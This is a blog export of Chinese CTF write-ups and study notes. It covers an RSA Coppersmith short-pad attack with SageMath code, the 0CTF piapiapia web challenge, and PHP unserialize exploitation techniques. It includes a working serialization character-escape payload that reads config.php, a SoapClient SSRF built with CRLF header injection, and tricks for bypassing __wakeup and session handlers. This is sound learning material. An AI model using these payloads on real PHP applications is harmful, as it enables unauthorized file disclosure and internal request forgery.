[{"title":"writeup for 2021 NepCTF(To be continued","date":"2021-03-24T07:59:39.000Z","path":"2021/03/24/writeup-for-2021-NepCTF/","text":"太菜了太菜了太菜了, 虽然说跑出去玩了两天, 但还是花了半天时间做的, 一道Coppersmith’s short-pad attack没有想到调$\\beta$, 做了半天都没出来, 属实拉了. 最后也就做了个改表的base64….算是除了签到就没出吧(还有道古典不想查了5555 0x00 Real_Baseproblem12345678910111213141516171819202122232425262728293031323334#py2import stringimport randomfrom secret import flag,b_chardef encode(s): res=&#x27;&#x27; binstr=[ bin(ord(s[i])).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in range(len(s))] p1=len(binstr) // 3 p2=len(binstr) % 3 part1 = binstr[0:3*p1] for i in range(p1): str_p1=binstr[i*3]+binstr[i*3+1]+binstr[i*3+2] tmp_str = [str_p1[x: x + 6] for x in [0, 6, 12, 18]] tmp_res = [b_char[int(x,2)]for x in tmp_str] res+=&#x27;&#x27;.join(tmp_res) if p2: part2 = binstr[3*p1:] str_p2 = &#x27;&#x27;.join(part2)+(3-p2)*&#x27;0&#x27;*8 tmp_str = [str_p2[x: x + 6] for x in [0, 6, 12, 18]][:p2+1] tmp_res = [b_char[int(x,2)]for x in tmp_str] res+=&#x27;&#x27;.join(tmp_res) res +=&#x27;=&#x27;*(3-p2) return res m1=random.sample(list(b_char),50)print &#x27;&#x27;.join(m1)print encode(m1)print encode(flag)# rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P# 2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa=# tCvM4R3TzvZ7nhjBxSiNyxmP28e7qCjVxQn91SRM3gBKzxQ= 看了一下整个过程, 就是个base64, 但是表未知, 直接通过一对明文和密文回推表, 得出部分表基本上就能猜出整个表了, 直接用改过的表解码就行了. exp 当时做的时候的脚本不见了5555555 0x01 你们一天天的不写代码, 难道是在等待爱情古典大混合, 什么银河字母, 古精灵…..不找了 0x02 ChildRSAproblem12345678910111213141516171819202122232425262728293031323334353637383940414243#childrsa.pyfrom Crypto.Util.number import *from gmpy2 import irootfrom os import *from secret import flag1,flag2,padding1,padding2assert len(flag1)==20assert len(flag1)&gt;len(flag2)assert len(flag2)==len(padding2)def init1(): m=(padding1*2**200+bytes_to_long(flag1))*2**200 r1=getPrime(170) r2=getPrime(170) p=getPrime(1024) q=getPrime(1024) N=p*q return m,r1,r2,N def enc1(m,r1,r2,N): c1=pow(m+r1,3,N) c2=pow(m+r2,3,N) return c1,c2def init2(): prefix = 2**1000 r3 = prefix+flag2*2**200 r4 = 2*prefix+padding2*2**200 return r3,r4def enc2(r3,r4): c3 = pow(r3*r4,3) return c3(m,r1,r2,N) = init1()(c1,c2)=enc1(m,r1,r2,N)(r3,r4) = init2()c3 = enc2(r3,r4)print Nprint(c1,c2,c3)# output.txtN= ...(c1,c2,c3)= ... 就是这道题做了半天都没出来, 当时试了好久的Coppersmith’s short-pad attack(后面简写为Csp atk, 连$\\epsilon$都从0.01遍历到1了, 依旧没有出结果, 看了官方wp, WTF??? $\\beta$调成1???, 为什么? 抱着这个问题我又重新翻了一下Sagemath文档, 找到了small_roots()的解释: sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots(self, X=None, beta=1.0, epsilon=None, **kwds) ​ Let $N$ be the characteristic of the base ring this polynomial is defined over: N = self.base_ring().characteristic(). This method returns small roots of this polynomial modulo some factor $b$ of $N$ with the constraint that $b&gt;=N^β$. Small in this context means that if $x$ is a root of $f$ modulo $b$ then $|x|&lt;X$. This $X$ is either provided by the user or the maximum $X$ is chosen such that this algorithm terminates in polynomial time. If $X$ is chosen automatically it is $X=ceil(1/2N^{β^2/δ−ϵ})$. The algorithm may also return some roots which are larger than X. This algorithm in this context means Coppersmith’s algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May’s PhD thesis referenced below. INPUT: X – an absolute bound for the root (default: see above) beta – compute a root mod $b$ where $b$ is a factor of N and $b ≥N^β.$ ( Default: 1.0, so $b=N$. ) epsilon – the parameter $ϵ$ described above. (Default: $β/8$) **kwds – passed through to method Matrix_integer_dense.LLL(). REFERENCES: Don Coppersmith. Finding a small root of a univariate modular equation. In Advances in Cryptology, EuroCrypt 1996, volume 1070 of Lecture Notes in Computer Science, p. 155–165. Springer, 1996. http://cr.yp.to/bib/2001/coppersmith.pdf Alexander May. New RSA Vulnerabilities Using Lattice Reduction Methods. PhD thesis, University of Paderborn, 2003. http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf 文档里面给出了small_roots()使用的算法的paper, 有时间好好看一下.这个函数需要注意的有三个参数X,beta,epsilon, 其中beta和epsilon也就是$\\beta$和$ \\epsilon$ . 来看看这三个参数都该怎么填 $X$: 这个算是最好填的, 可以理解成smallroot的上界, 一般来说题目中给出了要解的小根的位数kbits就设置$X = 2^{kbits}$. 而在Csp atk中, 理论可解上界是$N.nbits \\over e^2$ $\\beta$: 这个$\\beta$可以理解成$N$的因子的下界, 对于常规RSA中的$N$, 一般就只有$1,N,p,q$四个因子, 我们可以选取$N,p,q$作为算法使用的因子, 所以其实$\\beta$可以从0取到1, 因为都可能成立, 但真正用的时候一般取$[0.4,0.6] \\cup {1}$. $\\epsilon$: 神奇的参数, 不填就是$\\beta \\over 8$, 文档中给出了一个关系式$X=ceil(1/2N^{β^2/δ−ϵ})$, 其实这个$ceil$可以暂时忽略掉, 所以就有$2X=N^{\\beta^2/\\delta-\\epsilon}$, 文档里并没有给出$\\delta$ 到底该如何取, 但从这题的官方wp中是给出了$\\delta = e^2$, 其实就是多项式的次数. 所以对于Csp atk来说, $\\epsilon = \\beta^{2} / e^2 - x$, $x$的取法为$N^x = X.nbits $ 所以说,$\\beta$填1也是阔以的! 因为factor里面是有$N$的! 按着上面的分析, 把从La佬那边拿来的Csp atk的板子稍微修改一下( 以后就用改进过的板子了嘿嘿嘿…. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def short_pad_attack(c1, c2, e, n , kbits = 0): if kbits == 0 : kbits = n.nbits()//(e*e) PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() x = ceil(n.nbits() // kbits) for b in [0.4,0.5,0.6,1]: eps = (b^2) / (e^2) - (1/x) print(eps) if eps &lt;= 0: eps = b / 8 print(&#x27;[+] try beta=&#123;&#125; epsilon=&#123;&#125;&#x27;.format(float(b),float(eps))) diff = h.small_roots(X=2^kbits, beta=b,epsilon=eps) if len(diff) &gt; 0 : print(&#x27;[+] find diff with beta=&#123;&#125; and epsilon=&#123;&#125;&#x27;.format(b,eps)) return diff print(&#x27;[-] can not find the diff&#x27;) return diff def related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]from Crypto.Util.number import long_to_bytes as l2bn = ...(c1,c2,c3)= ...e= 3diff = short_pad_attack(c1,c2,e,n,kbits=170)[0]res = related_message_attack(c1,c2,diff,e,n)l2b(res)# b&#x27;\\xd4!I\\x80M\\xf0\\x80\\\\\\xd9&gt;\\x19\\xad\\xdd^\\x1d$\\x99\\xc1V\\xc9/+\\xdc\\x97&quot;\\xb3 \\x03\\xef3\\xd1\\xea\\x04\\xf4\\x81z$\\xd2]&#123;\\xcb\\xc4\\x93\\xe7\\xf6\\xb7\\x9a\\xb2\\xe6a\\x9fl\\x99\\xady\\xa8\\x9e\\xa2\\xf5\\&#x27;\\xa2\\xfc\\xe0Z\\xa1\\x1c\\x15\\rQ\\x7fM\\x99T\\x93\\x04\\xc5\\xdd\\xdc\\x80\\xe4\\x0f\\x85)\\x9f\\xc3p\\xdc\\x03j.\\x87kU\\&#x27;Ud\\x0bD&quot;)\\x00\\x00\\x00\\x00\\x00Nep&#123;Nep_n3p_ba4_bad_\\x00\\x00\\x00\\x03\\tx@Q2\\x1b3\\x1f\\r\\xb2\\x95\\x86?kE\\x1f\\xe6\\xaay\\xf1\\xe5&#x27; 可以看到flag已经出来一部分了Nep&#123;Nep_n3p_ba4_bad_ 来看看怎么求flag2, 先把给的条件写出来, 我们记$flag_2 = f , padding = pd$$$r_3 = 2^{1000}+ 2^{200}f \\r_4 = 2^{1001}+ 2^{200}pd \\(r_3r_4)^3 = c_3$$官方wp上面说想考一下二元的Coopersmith, 先放着, 有空了学习一波. 这题还可以直接解一元二次方程直接出 解方程解法我们可以直接通过开三次方得出$r_3r_4 = R$咱们先联立一下$r3,r4$的两个式子$$2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \\cdot f = r_{34} \\tag1$$这里要注意一下, $pd,f \\le 2^{160}$, 也就是说$2^{400} pd \\cdot f &lt; 2^{1200}$所以其实咱们可以直接有$$2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \\cdot f \\equiv 2^{400}pd \\cdot f \\equiv r_{34} \\mod 2^{1200} \\2^{400}pd \\cdot f = r_{34} % \\ 2^{1200}$$这样我们就能求出$pd \\cdot f = a$了, 然后我们直接$(1)$式两边同时乘$f$, 把$pd \\cdot f$带入, 就可以构造出一个关于$f$的一元二次方程了.$$2^{2001} \\cdot f + 2^{1200} a +2^{1201}f^2+ 2^{400} a \\cdot f = r_{34} \\cdot f$$解出$f$发现…是假flag, md我算了那么久居然是个假的??? 突然想到会不会padding2才是真正的flag, 又把padding2算出来了, 果然….padding2才是真flag exp12345678c = int(c3.nth_root(3) % (2^2001))pdf = int(c %2^1200 // 2^400)x = var(&#x27;x&#x27;)f = 2^1200 * pdf - c * x + 2^1201 * x^2 + 2^400 * x * pdfflag2 = int(f.roots()[0][0])padding = pdf // flag2l2b(padding)# b&#x27;1_l0v3_9ou&#125;&#x27; 所以最后的flag就是Nep&#123;Nep_n3p_ba4_bad_1_l0v3_9ou&#125; 0x03 easyEncryption 暂时还没时间, 有空看看 0x04 lowExponent 暂时还没时间, 有空看看","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"Noting of [0CTF 2016]piapiapia","date":"2021-03-23T12:26:47.000Z","path":"2021/03/23/Noting-of-0CTF-2016-piapiapia/","text":"这题算是第一次做比较长的web题, 收获很多, 好好记录一下 概述这道题主要的考察点有: 源码泄露 数组绕过正则匹配和strlen() 反序列化字符逃逸 源码泄露就一个登录页面, 随便输入尝试弱密码登录无果.测试是否存在sql, 也没什么收获随手一试www.zip, 可以下载 存在源码泄露 源码主要有这几个文件: update.php register.php profile.php index.php config.php class.php 代码审计反序列化字符逃逸做ctf肯定要找flag, config.php中就有$flag, 所以要想办法读取config.php.大概浏览了一下, 在profile.php中发现了这么一行 $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;])); 再往上找找看这个函数中的参数是否可控, 下面是往上找的过程: 12345678910111213141516171819202122232425262728// profile.php$profile = unserialize($profile); // 可能存在反序列化漏洞, 也可以知道这里的$profile是个序列化串, 继续往前$phone = $profile[&#x27;phone&#x27;];$email = $profile[&#x27;email&#x27;];$nickname = $profile[&#x27;nickname&#x27;];$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));$profile=$user-&gt;show_profile($username); // $profile 是调用$user-&gt;show_profile()得到的// class.phppublic function show_profile($username) &#123; // profile是从数据库读出来的, 并且没有处理, 所以数据库中就是序列化字符串 $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125;public function update_profile($username, $new_profile) &#123; // profile上传时会经过一次过滤 $username = parent::filter($username); $new_profile = parent::filter($new_profile); // 这个过滤器会替换字符, 可以使得字符长度变长 $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; 看到这里大概就有思路了, $profile是上传至数据库后重新读取下来的, 而且上传之前会对序列化串进行一次替换, 替换存在字符数量增加, 也就意味着可以字符逃逸, 如果有字符逃逸, 那么完全可以伪造一个假的$profile[&#39;photo&#39;]=&#39;config.php&#39;, 然后读取flag 再继续往前看 123456789101112131415161718192021222324// register.php 提供了注册的入口, 注册完就能随便登录了, 登录后就能上传profile// update.php$username = $_SESSION[&#x27;username&#x27;];if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;);if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;);if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;);$file = $_FILES[&#x27;photo&#x27;];if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;);move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);$user-&gt;update_profile($username, serialize($profile)); 可以看到我们可以控制的有很多参数phone, email, nickname都可以, 但是如果要进行字符逃逸, 必然会被前面的正则发现导致上传失败, 所以要想办法绕过 数组绕过php中的数组是一个很神奇的东西, 他会有下面这些特性 md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) =null preg_match(pattern,Array()) = false strcmp(Array(), “abc”) =null strpos(Array(),“abc”) = null strlen(Array()) = null 5.3以下版本无报错, 5.3及以上版本会出现E_NOTICE级别错误, 下面有关于错误等级的一些知识 我们可以看到, 如果参数是数组, 那么preg_match()和strlen()都会返回NULL,并且出现E_NOTICE错误, 这个错误是不影响程序继续运行的. 所以, 我们只要传参nickname[]=xxxxxx, 就可以绕过这个正则, 任意控制参数$_POST[&#39;nickname&#39;]了 12if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); PHP 错误等级E_NOTICE 表示一般情形不记录，只有程式有错误情形时才用到，例如企图存取一个不存在的变数，或是呼叫 stat() 函式检视不存在的档案。E_WARNING 通常都会显示出来，但不会中断程式的执行。这对除错很有效。例如：用有问题的常规表示法呼叫 ereg()。E_ERROR 通常会显示出来，亦会中断程式执行。意即用这个遮罩无法追查到记忆体配置或其它的错误。E_PARSE 从语法中剖析错误。E_CORE_ERROR 类似 E_ERROR，但不包括 PHP核心造成的错误。E_CORE_WARNING 类似 E_WARNING，但不包括 PHP 核心错误警告。 所以整个流程就是 通过绕过正则任意上传nickename -&gt; 替换serialize_string中的字符改变字符长度造成字符逃逸 -&gt; 利用file_get_contents()读取config.php payload构造那么要怎么构造nickname[]来进行字符逃逸呢, 先来看看这个序列化字符串大概是怎样的 1234567$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;11111111@qq.com&#x27;;$profile[&#x27;nickname&#x27;] = $_GET[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);echo serialize($profile);# ?nickname[]=# a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:0:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; 如果我们想最后反序列化出来的photo =&gt; config.php,那么传上去的nickname最后一段应该是这个&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;, 这段字符一共34个, 再看一下替换的函数 123$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; # 过滤&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27; 替换成hackerreturn preg_replace($safe, &#x27;hacker&#x27;, $string); 可以看到, 序列化后的字符串serialize_string中存在where时会被替换成hacker, 那么字符串长度就会+1所以nickname中需要34个where就能把后面的字符挤出去实现逃逸, 可以看一下具体效果 12345678910111213# ?nickname[]=#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;11111111@qq.com&#x27;;$profile[&#x27;nickname&#x27;] = $_GET[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);echo serialize($profile);# a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;echo filter(serialize($profile));# a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125; 等到反序列化的时候, 就只会反序列化前面一部分了 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 结果就会是: 12345array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;11111111111&quot; [&quot;email&quot;]=&gt; string(15) &quot;11111111@qq.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(204) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot; &#125; [&quot;photo&quot;]=&gt; string(10) &quot;config.php&quot; &#125; 成功了! EXP先随便注册一个用户并登录，在profile上传的时候先随便填写数据，再抓包，将nickname改成nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 上传完后访问profile.php, 查看图片的地址，最后把base64转成文本就有flag了","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"源码泄露","slug":"源码泄露","permalink":"http://tearsjin.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"unsrialize","slug":"unsrialize","permalink":"http://tearsjin.github.io/tags/unsrialize/"},{"name":"字符逃逸","slug":"字符逃逸","permalink":"http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"},{"name":"正则绕过","slug":"正则绕过","permalink":"http://tearsjin.github.io/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"}]},{"title":"The learning of php unserialize","date":"2021-03-23T06:20:24.000Z","path":"2021/03/23/The-learning-of-php-unserialize/","text":"概述当unserialize()的参数可控时, 可以传入一个构造好的序列串控制类内部的变量甚至函数, 如果类内部存在比较危险的函数include() eval()等等, 将会造成严重后果 如何利用当服务端代码中存在某个类的时候, 可以通过unserialize()创建一个该类的对象, 而我们可控的就是类中的属性, 还可以利用一些技巧去绕过一些魔术方法或者是利用一些魔术方法. 通过控制魔术方法和属性达到我们想要的攻击效果. 一般流程 寻找参数可控的unserialize() 寻找可以用于命令执行, 文件包含等等的函数在危险类 找到一个控制链控制危险类中的危险函数 魔术方法1234567891011__wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数__destruct() &#x2F;&#x2F;对象被销毁时触发__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发__get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法__set() &#x2F;&#x2F;用于将数据写入不可访问的属性__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发__toString() &#x2F;&#x2F;把类当作字符串使用时触发__invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发 需要注意的是, __toString()这个方法触发的方式比较多: echo ($obj) / print($obj) 打印时会触发 反序列化对象与字符串连接时 反序列化对象参与格式化字符串时 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） 反序列化对象参与格式化SQL语句，绑定参数时 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 反序列化的对象作为 class_exists() 的参数的时候 关于绕过的Trick绕过__wake() 版本:php 5&lt; 5.6.25php 7&gt; 7.0.10 利用方法:当序列化的字符串中的属性个数大于类中实际的属性个数时, 就会跳过__wake()函数 绕过正则表达式 加号绕过, 在反序列化的时候, 数字前面的加号会被当成是正号而正则匹配的时候则不会这样识别 比如说O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;, 有时候题目会通过正则O\\:\\d来匹配O:4, 这时将序列改成O:+4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;就能绕过该匹配 变量引用利用变量引用使得类中两个变量始终相等 php原生类反序列化SoapClient反序列化利用概述php安装php-soap扩展之后, 可以反序列化原生类SoapClient, 来发送http post请求来实现SSRF通过反序列化SoapClient对象后调用不存在的方法触发__call()方法这个__call()方法会向指定URL发送HTTP POST请求, 因为User-Agent字段可控, 所以可以通过CRLF来构造请求头实现自定义POST DATA 如果要在自己的环境复现则需要更改php.ini中的extension=soap 利用方法举个栗子 1234567&lt;?php $target = &quot;http://127.0.0.1/test.php&quot;; $ua = &quot;kirito-zbds&quot;; $a = new SoapClient(NULL,array(&#x27;location&#x27;=&gt;$target,&#x27;uri&#x27;=&gt;&#x27;k1rit0&#x27;,&#x27;user_agent&#x27;=&gt;$ua)); $b = serialize($a); $c = unserialize($b); $c -&gt; tan90_function(); 当SoapClient对象被逆序列化出来并调用一个不存在的tan90_function()方法时.__call()方法会向location也就是http://127.0.0.1/test.php发送一个HTTP POST请求, 而请求头中会有: 12User-Agent: kirito-zbdsSOAPAction: k1rit0#tan90_function() &#x2F;&#x2F; uri + 被调用的不存在的函数名 可以看到, 请求头中的这些字段会变成可控的, 但这样只能通过内网访问test.php, 并不能任意POST数据. 要想POST数据, 就要用到CRLF了. 什么是CRLFCRLF就是\\r\\n的缩写, HTTP协议中header之间是用一个\\r\\n来分隔的, 而HTTP header和HTTP body之间是用\\r\\n\\r\\n也就是两个\\r\\n来分割的. 如果请求头中的字段可控, 那么可以手动添加\\r\\n用以在请求中添加字段甚至是添加HTTP body用以POST data. 比如在上面的例子中, 我们把$ua改为 1$ua = &quot;kirito-zbds\\r\\nContent-Type:application-www-form-urlencoded\\r\\nContent-Length:17\\r\\n\\r\\ndata=this_is_data&quot; 那么HTTP POST的请求头中就会出现这么一串 123456User-Agent: kirito-zbdsContent-Type: application-www-form-urlencodedContent-Length: 17data&#x3D;this_is_dataSOAPAction: k1rit0#tan90_function() 这样就成功伪造出HTTP POST请求并传输参数了 php-session反序列化又是session, 上次在文件包含也有session, 其实这里的反序列化也要用到那边的知识 概述关于session.upload_progress这个php-session反序列化其实跟session.uplaod_progress有关, 详细的可以看文件包含那部分的笔记这里只简单的说一下, 服务端的php.ini默认配置session.use_strict_mode = 0, 这样用户可以自己设置Cookies: PHPSESSID = xxxxxx, 服务端将会创建一个/tmp/sess_xxxxxx文件 并且, 如果用户向服务端传送文件, 那么服务端将会在/tmp/sess_xxxxxx中写入上传进度, 最重要的是. 如果用户的POST DATA中含有PHP_SESSION_UPLOAD_PROGRESS=xxx, 那么服务端将会在/tmp/sess_xxxxxx中写入 1upload_progress_xxx | 上传进度 关于session.serialize_handler在执行php代码时可以设置这么两个东西 12ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;); 这里设置的是php处理session的方式,php或php_serialize. 默认是php这两个方式的不同就在于, 存取session文件的格式不同.下面从一个例子来详细的看一下这两个方式的区别 123456&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);// ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;k1rit0&#x27;] = $_GET[&#x27;a&#x27;];var_dump($_SESSION); php方式的存取的格式是:键名|serialize_string, 当我传?a=a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;session文件中存的是k1rit0|s:45:&quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;; 而如果用的是php_serialize方式,存取的格式就是serialize_string, session文件中存的便是a:1:&#123;s:6:&quot;k1rit0&quot;;s:45:&quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125; 利用方法根据上面的两个session存取方法, 如果我们先以php_serialize储存 再按php的方式读取, 就可以反序列化一些恶意的序列. 就拿上面的例子来说, 先以php_serialize储存?a=|a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;,注意那个| 这个时候来看看session里是啥 1a:1:&#123;s:6:&quot;k1rit0&quot;;s:46:&quot;|a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125; 如果这个时候, 按php的方式读取这个session文件, 就会被识别成两部分: |前面的a:1:&#123;s:6:&quot;k1rit0&quot;;s:46:&quot; |后面的a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;&#125;&quot;;&#125; |后面的前一部分``a:2:{s:4:”name”;s:6:”kirito”;s:3:”age”;i:14;}`, 会被识别成一个完整的序列化串 这里有个session_start()的小知识, 如果php代码中存在session_start()而且处理session的方式是php, 那么在执行session_start()时会反序列化session中|后的序列化串, 并赋值给$_SESSION变量 如果php代码中某些类中有__wake()或__destruct(), 并且这两个魔法函数中存在危险的函数, 则可以通过session反序列化控制这些危险函数. 至于如何在session文件中写入恶意序列化串呢? 那就要用到session.upload_progress中的PHP_SESSION_UPLOAD_PROGRESS了, 具体怎么用, 去看文件包含那篇笔记吧 反序列化字符逃逸如果存在对序列化后的字符进行替换, 并且替换后字符长度会变, 则有可能存在字符逃逸 替换后字符变长1234function change($str)&#123; return str_replace(&quot;o&quot;, &quot;oo&quot;, $str);&#125; 比如说上面这个函数, 把输入的字符串中的o替换成oo如果有这么个数组array(&quot;name&quot; =&gt; &quot;kirito&quot;,&quot;level&quot; =&gt; &quot;18&quot;);,序列化之后就是a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:5:&quot;level&quot;;s:2:&quot;18&quot;;&#125;再用上面的函数处理序列化字符串, 